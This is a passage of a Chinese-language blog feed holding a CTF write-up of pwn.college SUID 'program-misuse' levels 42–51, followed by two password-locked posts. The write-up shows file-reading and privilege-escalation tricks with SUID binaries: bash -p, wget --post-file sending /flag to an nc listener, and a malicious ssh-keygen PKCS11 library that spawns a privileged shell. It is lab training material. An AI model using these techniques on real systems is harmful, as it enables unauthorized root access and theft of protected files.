class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 打开文件</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    <span class="token comment"># 读取文件内容</span>    content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># 打印文件内容</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="level43ruby"><a class="markdownIt-Anchor" href="#level43ruby"></a> level43(ruby)</h3><p>不会ruby，拷打gpt</p><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># 打开文件</span>file <span class="token operator">=</span> <span class="token builtin">File</span><span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">'/flag'</span></span><span class="token punctuation">,</span> <span class="token string-literal"><span class="token string">'r'</span></span><span class="token punctuation">)</span><span class="token comment"># 读取文件内容</span>content <span class="token operator">=</span> file<span class="token punctuation">.</span>read<span class="token comment"># 输出文件内容</span>puts content<span class="token comment"># 关闭文件</span>file<span class="token punctuation">.</span>close<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ruby level43.ruby<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level44bash"><a class="markdownIt-Anchor" href="#level44bash"></a> level44(bash)</h3><ul><li>写bash脚本</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">while</span> <span class="token builtin class-name">read</span> <span class="token parameter variable">-r</span> line<span class="token punctuation">;</span> <span class="token keyword">do</span>    <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$line</span>"</span><span class="token punctuation">;</span><span class="token keyword">done</span> <span class="token operator">&lt;</span> /flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>发现没有权限读取</p><p>实际上发生的情况是，由于我们已经设置了 <code>SUID</code> ，所以我们正在像 <code>bash</code> 那样执行 <code>pseudo-root</code> ，但当 <code>bash</code> 发现我们并不是真正的 <code>root</code> ，而是在扮演 <code>root</code> 的角色时，它会取消我们在 <code>SUIDing</code>  <code>bash</code> 时获得的特权。这种做法被称为 <code>mitigation</code> ，它可以减少 <code>command injection</code> 造成的伤害，因为大多数情况下， <code>command injection vulnerabilities end up hijacking /bin/sh</code> 。</p><p>To disable <code>mitigation</code> , <code>bash -p [command]</code> is used.要禁用 <code>mitigation</code> ，可以使用 <code>bash -p [command]</code> 直接设置为特权模式</p><p>所以直接使用 <code>bash -p /flag</code></p><h3 id="level45date"><a class="markdownIt-Anchor" href="#level45date"></a> level45(date)</h3><p>date，原来的作用是显示当前时间或者将时间按格式输出，但是用<code>-f</code>可以读取文件，如果文件内容不是正常的日期，则会回显出来。</p><p><code>date -f /flag</code></p><h3 id="level46dmesg"><a class="markdownIt-Anchor" href="#level46dmesg"></a> level46(dmesg)</h3><p><code>dmesg</code>（&quot;display message&quot;的缩写）命令用于显示Linux内核环缓冲区中的消息。它提供了一个查看系统引导过程中发生的事件和错误的途径，以及与设备、驱动程序和其他内核组件相关的信息。</p><p>基本用法：</p><pre class="line-numbers language-none"><code class="language-none">dmesg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将显示内核环缓冲区中的所有消息。为了使输出易于管理，你可能需要将其与管道符（|）一起使用，以便进行分页或搜索：</p><pre class="line-numbers language-none"><code class="language-none">dmesg | less<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>你也可以使用<code>grep</code>命令来过滤特定的信息，比如只显示关于硬盘的信息：</p><pre class="line-numbers language-none"><code class="language-none">dmesg | grep sda<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果你只想查看最近的N行消息，你可以使用<code>tail</code>命令：</p><pre class="line-numbers language-none"><code class="language-none">dmesg | tail -n 20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>你也可以将<code>dmesg</code>输出保存到文件中以供后续参考：</p><pre class="line-numbers language-none"><code class="language-none">dmesg &gt; dmesg_output.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>dmesg</code>命令的输出通常包括与系统引导、设备识别、驱动程序加载、硬件错误和其他系统级事件相关的消息。</p><p>此题直接使用<code>dmesg -F /flag</code></p><h3 id="level47wc"><a class="markdownIt-Anchor" href="#level47wc"></a> level47(wc)</h3><p><code>wc</code> 是一个常用的命令行工具，用于统计文件中的字数、行数和字符数。它的名字代表 “word count”，但实际上它能够提供更多信息。通过在命令行中输入 <code>wc</code> 加上文件名，它会返回文件中的行数、字数和字符数。</p><p><code>wc</code> 命令的常见用法包括：</p><ol><li><p>统计文件的行数：</p><pre class="line-numbers language-none"><code class="language-none">wc -l filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>统计文件的单词数：</p><pre class="line-numbers language-none"><code class="language-none">wc -w filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>统计文件的字符数：</p><pre class="line-numbers language-none"><code class="language-none">wc -c filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>统计文件的字节数（考虑多字节字符）：</p><pre class="line-numbers language-none"><code class="language-none">wc -m filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>统计文件中最长行的长度：</p><pre class="line-numbers language-none"><code class="language-none">wc -L filename<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>统计多个文件的总行数、单词数和字符数：</p><pre class="line-numbers language-none"><code class="language-none">wc -lwc filename1 filename2 filename3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>通过管道符将其他命令的输出传递给 <code>wc</code> 进行统计，例如：</p><pre class="line-numbers language-none"><code class="language-none">cat filename | wc -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>wc，wc命令原作用是统计文件的字节数、字数、行数。但是通过<code>--files0-from</code>参数可以从文件中读取文件名，所以如果文件内容不是一个正常的文件名的话就会回显出来，如下：</p><pre class="line-numbers language-none"><code class="language-none">wc --files0-from&#x3D;&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="level48gcc"><a class="markdownIt-Anchor" href="#level48gcc"></a> level48(gcc)</h3><ul><li>思路1是直接编写一个C文件，然后读取/flag</li></ul>  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   FILE <span class="token operator">*</span> fptr<span class="token punctuation">;</span>   fptr <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>fptr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Error opening file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">char</span> line<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> fptr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token function">fclose</span><span class="token punctuation">(</span>fptr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>或者可以直接预处理/flag文件,头文件包含即可，报错信息会回显/flag</li></ul><p>​<code>gcc -x c -E /flag</code></p><h3 id="level49as"><a class="markdownIt-Anchor" href="#level49as"></a> level49(as)</h3><p>as是GNU组织推出的一款汇编语言编译器，它支持多种不同类型的处理器。报错会回显问文件信息。</p><p>想要去除一些杂乱信息就这样：</p><pre class="line-numbers language-none"><code class="language-none">as @&#x2F;flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="level50wget"><a class="markdownIt-Anchor" href="#level50wget"></a> level50(wget)</h3><p>wget，wget是Linux系统下载文件工具。</p><p>一般可以通过<code>-i</code>参数来获取文件中内容，不过发现它把大写字母全部转成小写字母了，这不是我们想要的。</p><p>查看有关文件的命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level50:/challenge$ <span class="token function">wget</span> <span class="token parameter variable">--help</span> <span class="token operator">|</span><span class="token function">grep</span> FILE  -o,  --output-file<span class="token operator">=</span>FILE          log messages to FILE  -a,  --append-output<span class="token operator">=</span>FILE        append messages to FILE  -i,  --input-file<span class="token operator">=</span>FILE           download URLs found <span class="token keyword">in</span> <span class="token builtin class-name">local</span> or external FILE       <span class="token parameter variable">--config</span><span class="token operator">=</span>FILE               specify config <span class="token function">file</span> to use       --rejected-log<span class="token operator">=</span>FILE         log reasons <span class="token keyword">for</span> URL rejection to FILE  -O,  --output-document<span class="token operator">=</span>FILE      <span class="token function">write</span> documents to FILE       --load-cookies<span class="token operator">=</span>FILE         load cookies from FILE before session       --save-cookies<span class="token operator">=</span>FILE         save cookies to FILE after session       --post-file<span class="token operator">=</span>FILE            use the POST method<span class="token punctuation">;</span> send contents of FILE       --body-file<span class="token operator">=</span>FILE            send contents of FILE. <span class="token parameter variable">--method</span> MUST be <span class="token builtin class-name">set</span>       <span class="token parameter variable">--certificate</span><span class="token operator">=</span>FILE          client certificate <span class="token function">file</span>       --private-key<span class="token operator">=</span>FILE          private key <span class="token function">file</span>       --ca-certificate<span class="token operator">=</span>FILE       <span class="token function">file</span> with the bundle of CAs       --crl-file<span class="token operator">=</span>FILE             <span class="token function">file</span> with bundle of CRLs       <span class="token parameter variable">--pinnedpubkey</span><span class="token operator">=</span>FILE/HASHES  Public key <span class="token punctuation">(</span>PEM/DER<span class="token punctuation">)</span> file, or any number       --random-file<span class="token operator">=</span>FILE          <span class="token function">file</span> with random data <span class="token keyword">for</span> seeding the SSL PRNG       --warc-file<span class="token operator">=</span>FILENAME        save request/response data to a .warc.gz <span class="token function">file</span>       --warc-dedup<span class="token operator">=</span>FILENAME       <span class="token keyword">do</span> not store records listed <span class="token keyword">in</span> this CDX <span class="token function">file</span>hacker@program-misuse~level50:/challenge$ <span class="token function">wget</span> <span class="token parameter variable">--help</span> <span class="token operator">|</span><span class="token function">grep</span> <span class="token function">file</span>Logging and input file:  -o,  --output-file<span class="token operator">=</span>FILE          log messages to FILE  -i,  --input-file<span class="token operator">=</span>FILE           download URLs found <span class="token keyword">in</span> <span class="token builtin class-name">local</span> or external FILE  -F,  --force-html                treat input <span class="token function">file</span> as HTML  -B,  <span class="token parameter variable">--base</span><span class="token operator">=</span>URL                  resolves HTML input-file links <span class="token punctuation">(</span>-i -F<span class="token punctuation">)</span>       <span class="token parameter variable">--config</span><span class="token operator">=</span>FILE               specify config <span class="token function">file</span> to use       --no-config                 <span class="token keyword">do</span> not <span class="token builtin class-name">read</span> any config <span class="token function">file</span>                                     existing files <span class="token punctuation">(</span>overwriting them<span class="token punctuation">)</span>  -c,  <span class="token parameter variable">--continue</span>                  resume getting a partially-downloaded <span class="token function">file</span>  -N,  <span class="token parameter variable">--timestamping</span>              don<span class="token string">'t re-retrieve files unless newer than       --no-use-server-timestamps  don'</span>t <span class="token builtin class-name">set</span> the <span class="token builtin class-name">local</span> <span class="token function">file</span><span class="token string">'s timestamp by       --restrict-file-names=OS    restrict chars in file names to ones OS allows       --ignore-case               ignore case when matching files/directories       --unlink                    remove file before clobber       --xattr                     turn on storage of metadata in extended file attributes  -P,  --directory-prefix=PREFIX   save files to PREFIX/..       --save-headers              save the HTTP headers to file       --post-file=FILE            use the POST method; send contents of FILE       --body-file=FILE            send contents of FILE. --method MUST be set                                     choosing local file names (EXPERIMENTAL)       --certificate=FILE          client certificate file       --private-key=FILE          private key file       --ca-certificate=FILE       file with the bundle of CAs       --crl-file=FILE             file with bundle of CRLs       --pinnedpubkey=FILE/HASHES  Public key (PEM/DER) file, or any number       --random-file=FILE          file with random data for seeding the SSL PRNG       --hsts-file                 path of HSTS database (will override default)       --no-remove-listing         don'</span>t remove <span class="token string">'.listing'</span> files       --no-glob                   turn off FTP <span class="token function">file</span> name globbing       --preserve-permissions      preserve remote <span class="token function">file</span> permissions       --retr-symlinks             when recursing, get linked-to files <span class="token punctuation">(</span>not <span class="token function">dir</span><span class="token punctuation">)</span>       --warc-file<span class="token operator">=</span>FILENAME        save request/response data to a .warc.gz <span class="token function">file</span>       --warc-max-size<span class="token operator">=</span>NUMBER      <span class="token builtin class-name">set</span> maximum size of WARC files to NUMBER       --warc-cdx                  <span class="token function">write</span> CDX index files       --warc-dedup<span class="token operator">=</span>FILENAME       <span class="token keyword">do</span> not store records listed <span class="token keyword">in</span> this CDX <span class="token function">file</span>       --no-warc-compression       <span class="token keyword">do</span> not compress WARC files with GZIP       --no-warc-keep-log          <span class="token keyword">do</span> not store the log <span class="token function">file</span> <span class="token keyword">in</span> a WARC record       --warc-tempdir<span class="token operator">=</span>DIRECTORY    location <span class="token keyword">for</span> temporary files created by the       --delete-after              delete files locally after downloading them                                     <span class="token builtin class-name">local</span> files       --convert-file-only         convert the <span class="token function">file</span> part of the URLs only <span class="token punctuation">(</span>usually known as the <span class="token function">basename</span><span class="token punctuation">)</span>       <span class="token parameter variable">--backups</span><span class="token operator">=</span>N                 before writing <span class="token function">file</span> X, rotate up to N backup files  -K,  --backup-converted          before converting <span class="token function">file</span> X, back up as X.orig<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以利用它的文件上传功能来进行读取文件的原本内容，如下：</p><pre class="line-numbers language-none"><code class="language-none">nc -lp 8888 &amp; wget --post-file&#x3D;&#x2F;flag http:&#x2F;&#x2F;127.0.0.1:8888  &#x2F;&#x2F;监听本地8888端口，并且用wget上传&#x2F;flag到本地8888端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>nc</code> 是一个功能强大的网络工具，常用于创建 TCP 或 UDP 连接，发送或接收数据，执行端口扫描等操作。以下是 <code>nc</code> 常用的命令和参数：</p><h4 id="常用命令"><a class="markdownIt-Anchor" href="#常用命令"></a> 常用命令：</h4><ol><li><p><strong>监听模式</strong>：用于启动一个服务器以监听连接请求。</p><pre class="line-numbers language-none"><code class="language-none">nc -l &lt;port&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>连接到远程主机和端口</strong>：</p><pre class="line-numbers language-none"><code class="language-none">nc &lt;hostname&#x2F;IP&gt; &lt;port&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>从标准输入发送数据</strong>：</p><pre class="line-numbers language-none"><code class="language-none">nc &lt;hostname&#x2F;IP&gt; &lt;port&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>从文件发送数据</strong>：</p><pre class="line-numbers language-none"><code class="language-none">nc &lt;hostname&#x2F;IP&gt; &lt;port&gt; &lt; file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>发送数据并接收回复</strong>：</p><pre class="line-numbers language-none"><code class="language-none">nc -z &lt;hostname&#x2F;IP&gt; &lt;port&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="常用参数"><a class="markdownIt-Anchor" href="#常用参数"></a> 常用参数：</h4><ol><li><code>-l</code>：监听模式。</li><li><code>-p &lt;port&gt;</code>：指定本地端口号。</li><li><code>-e &lt;command&gt;</code>：指定在建立连接后执行的命令。</li><li><code>-u</code>：使用 UDP 协议。</li><li><code>-t</code>：使用 TCP 协议（默认）。</li><li><code>-v</code>：显示详细信息。</li><li><code>-w &lt;timeout&gt;</code>：设置超时时间。</li><li><code>-i &lt;interval&gt;</code>：设置发送数据包的间隔时间。</li><li><code>-s &lt;source&gt;</code>：设置本地源地址。</li><li><code>-z</code>：进行端口扫描，但不建立连接。</li><li><code>-k</code>：保持连接，持续监听传入的连接。</li><li><code>-d</code>：启用调试模式。</li><li><code>-h</code> 或 <code>--help</code>：显示帮助信息。</li></ol><p>这些命令和参数可以根据具体的需求组合使用，帮助实现各种网络调试、探测和传输任务。</p><h3 id="level51ssh-keygen"><a class="markdownIt-Anchor" href="#level51ssh-keygen"></a> level51(ssh-keygen)</h3><p>根据这一关卡的描述，题目大致是要求我们加载一段自己写的代码，阅读<code>ssh-keygen</code>的<code>man</code>文档 ,可以发现ssh-keygen可以加载一个名叫<code>pkcs11</code>的库文件,这个库的名字是<code>shared library</code>，因此是一个</p><p><code>dynamic link library</code>,我们要将我们的代码加载进去，就必须创建一个dll</p><p><code>gcc -shared -o libexample.so example.c</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse-level-51:~$ <span class="token function">touch</span> test.chacker@program-misuse-level-51:~$ gcc <span class="token parameter variable">-c</span> <span class="token parameter variable">-fPIC</span> test.c <span class="token parameter variable">-o</span> test.ohacker@program-misuse-level-51:~$ <span class="token function">ls</span>Desktop  demo  key  key.pub  test.c  test.ohacker@program-misuse-level-51:~$ gcc <span class="token parameter variable">-shared</span> test.o <span class="token parameter variable">-o</span> test.sohacker@program-misuse-level-51:~$ <span class="token function">ls</span>Desktop  demo  key  key.pub  test.c  test.o  test.sohacker@program-misuse-level-51:~$ ssh-keygen <span class="token parameter variable">-D</span> ./test.so ./test.so does not contain expected string C_GetFunctionListprovider ./test.so is not a PKCS11 librarycannot <span class="token builtin class-name">read</span> public key from pkcs11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据报错信息，我们需要在这个dll中有一个<code>C_GetFunctionList</code></p><p>那么改写我们的c代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">C_GetFunctionList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello World\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>FILE<span class="token operator">*</span> fp<span class="token punctuation">;</span>fp <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">char</span> line<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>line<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> line<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hacker@program-misuse~level51:~/demo$ ssh-keygen <span class="token parameter variable">-D</span> ./level51.so Hello Worldpwn.college<span class="token punctuation">&#123;</span>URDrFXWtQjHXjtkQO4hH4oWCj6X.01M5EDLzczN0UzW<span class="token punctuation">&#125;</span>Segmentation fault<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr /><p>官方教学</p><p>知识点：</p><ol><li><p>首先是ssh-keygen用-D参数可以直接运行任意的共享库，如果有suid的话就能运行我们的恶意代码造成提权，共享库的创建方式见下方。</p><p>使用方法：</p><pre class="line-numbers language-none"><code class="language-none">ssh-keygen -D .&#x2F;su.os<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>可以利用c语言代码：</p><pre class="line-numbers language-none"><code class="language-none">sendfile(1,open(&quot;&#x2F;flag&quot;,0),0,4096);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>来打开文件，并且将内容发送给标准输出显示。</p></li><li><p>可以利用设置c语言的attribute属性来使函数在程序预处理阶段运行：</p><pre class="line-numbers language-none"><code class="language-none">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;static void inject() __attribute__((constructor));void inject()&#123;printf(&quot;euid:%d\n&quot;,geteuid());sendfile(1,open(&quot;&#x2F;flag&quot;,0),0,4096);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>c程序的链接方式包括<strong>静态链接</strong>和<strong>动态链接</strong>两种。</p><p><strong>静态链接库</strong>，在以前，程序是独立的，编个程序要从头到尾自己考虑。后来为了方便，把通用的程序放在一起，这就是库，遇到需要类似的功能就可以调用。但是这个有个问题，计算机不知道你要用的是链接库哪一个程序， 所以它不得不将链接库全部程序包含进来，使得程序很大。 <strong>动态链接库</strong>，本身和静态链接没什么区别，也是把通用代码写进一些独立文件里，但是在编译方面，微软绕了个圈子，并没有采取把库文件加进程序的方法，而是把库文件做成已经编译好的程序，给它们开个交换数据的接口，写程序的时候，一旦要使用某个库文件的一个功能函数，系统就把这个库文件调入内存，连接上这个程序占有的任务进程，然后执行程序要用的功能函数，并把结果返回给程序显示出来，在我们看来，就像是程序自己带有的功能一样。 完成需要的功能后，这个DLL停止运行，整个调用过程结束。 DLL是编译好的代码，与一般程序没什么大差别，只是它不能独立运行，需要程序调用。DLL的代码和其他程序几平没什么两样，仅仅是接口和启动模式不同。</p></li><li><p>gcc可以通过<code>-shared</code>参数来创建共享库，共享库不能单独运行，它相当于一个必须被别人调用才能运行的程序，它与普通二进制程序的区别可以通过file命令来查看，共享库没有<code>interpreter</code>这样的字段，也就是没有链接解释器。</p><pre class="line-numbers language-none"><code class="language-none">gcc 51.c -shared -o su.os<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>c程序中可以利用&lt;dlfcn.h&gt;头文件中的一系列函数dlopen，dlclose来加载运行共享库，详细说明可以通过：</p><pre class="line-numbers language-none"><code class="language-none">man dlopen<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>来查看。</p></li><li><p>ldd命令 用于打印程序或者库文件所依赖的共享库列表。我们可以利用它来查看是否有可操作的os共享库，注入我们的代码。</p></li><li><p>另外一种查询方式是利用strace来查看程序运行全程，然后可以用grep来过滤一下：</p><pre class="line-numbers language-none"><code class="language-none">strace &#x2F;usr&#x2F;local&#x2F;bin&#x2F;suid-so 2&gt;&amp;1 | grep -i -E &quot;open|access|no such file&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p>编写51.c：</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;static void inject() __attribute__((constructor));void C_GetFunctionList()&#123;printf(&quot;euid:%d\n&quot;,geteuid());sendfile(1,open(&quot;&#x2F;flag&quot;,0),0,4096);&#x2F;&#x2F;system(&quot;cp &#x2F;bin&#x2F;bash &#x2F;tmp&#x2F;bash &amp;&amp; chmod +s &#x2F;tmp&#x2F;bash &amp;&amp; &#x2F;tmp&#x2F;bash -p&quot;);char *argvv[]&#x3D;&#123;&quot;bash&quot;,&quot;-p&quot;,NULL&#125;;execvp(&quot;&#x2F;bin&#x2F;bash&quot;,argvv);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译后用ssh-keygen的-D参数运行即可：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token number">51</span>.c <span class="token parameter variable">-shared</span> <span class="token parameter variable">-o</span> su.os/challenge/babysuid_level51ssh-keygen <span class="token parameter variable">-D</span> ./su.os<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结：</h3><p>本小节是SUID提权，可以让本没有相应权限的用户，访问它没有权限访问的程序</p><hr /><blockquote><p>level1~6   常用的读取文件内容的命令依次为：cat、more、less、tail、head、sort、rev</p><p>level7~9 常见的文本编辑器 依次为：vim、emacs、nano</p><p>11~13：<strong>常见的16进制读取命令</strong>，依次为：od、hexdump(hd)、xxd</p><p>level14~15 base系列编码命令依次为：base32、base64</p><p>16：<strong>分割文件命令</strong>，为：splite</p><p>17~23：<strong>常见压缩解压缩命令</strong>，依次为：gzip、bzip2、zip、tar、ar、cpio、genisoimage</p><p>24~31：<strong>可执行命令的常见命令</strong>，依次为：env、find、make、nice、timeout、stdbuf、setarch、watch</p><p>32：<strong>常见网络连接工具</strong>，为：socat</p><p>33：<strong>脚本对话框工具</strong>，为：whiptail</p><p>34~36：<strong>流式文本编辑器</strong>，为：awk、sed、ed</p><p>37~38：<strong>修改文件归属者或权限</strong>，为：chown、chmod</p><p>39~40：<strong>常见移动文件命令</strong>，cp、mv</p><p>41~44：脚本解释器 perl python ruby bash</p><p>45~50 其他可读取文件的命令 date,dmesg wc gcc as wget</p><p>51  ssh-keygen</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-practices</title>
      <link href="/2024/05/04/web-practices/"/>
      <url>/2024/05/04/web-practices/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="fed330498207309fdada58e6d5b16ce2710c5996d1103b5d626c6f89971df933"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-shrink">      <input class="hbe hbe-input-field hbe-input-field-shrink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-shrink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-shrink">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初识RSA</title>
      <link href="/2024/04/29/%E5%88%9D%E8%AF%86RSA/"/>
      <url>/2024/04/29/%E5%88%9D%E8%AF%86RSA/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="Oh, these decrypted content cannot be verified, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b418332096ed8fce7688edaa7c57535eaa3f5e83e186fb1d0007570e81394a2b">2cb0a3973d8965d04dd2d6888666ab11e6cbce00aade42d8a7041d1eff1aeec1</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-shrink">      <input class="hbe hbe-input-field hbe-input-field-shrink" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-shrink" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-shrink">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
